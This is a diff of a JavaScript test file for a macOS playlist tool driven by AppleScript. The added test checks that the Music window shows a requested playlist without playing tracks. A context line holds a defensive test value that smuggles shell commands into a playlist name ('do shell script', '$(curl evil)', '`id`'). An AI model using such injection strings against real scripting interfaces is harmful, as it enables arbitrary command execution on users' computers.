@@ -33,3 +33,28 @@ test('playlist matching rejects ambiguous normalized names and preserves executa
   const literal = '" & do shell script "touch /tmp/unwanted" & " $(curl evil) `id`'
   assert.equal(resolve(literal, ['Another playlist', literal]), 2)
 })
+
+test('playlist navigation changes the browser view and shows its window without playing tracks', {skip: process.platform !== 'darwin'}, () => {
+  const fixture = `${helpers}
+using terms from application "Music"
+    script requestedPlaylist
+        property persistent ID : "SYNTHETIC-PLAYLIST"
+    end script
+    script previousPlaylist
+        property persistent ID : "PREVIOUS-PLAYLIST"
+    end script
+    script syntheticWindow
+        property view : previousPlaylist
+        property visible : false
+        property collapsed : true
+    end script
+    if not my showPlaylist(requestedPlaylist, syntheticWindow) then error "Wrong playlist displayed"
+    if not visible of syntheticWindow then error "Window remained hidden"
+    if collapsed of syntheticWindow then error "Window remained minimized"
+    return persistent ID of view of syntheticWindow
+end using terms from
+`
+  const result = spawnSync('/usr/bin/osascript', ['-e', fixture], {encoding: 'utf8'})
+  assert.equal(result.status, 0, result.stderr)
+  assert.equal(result.stdout.trim(), 'SYNTHETIC-PLAYLIST')
+})
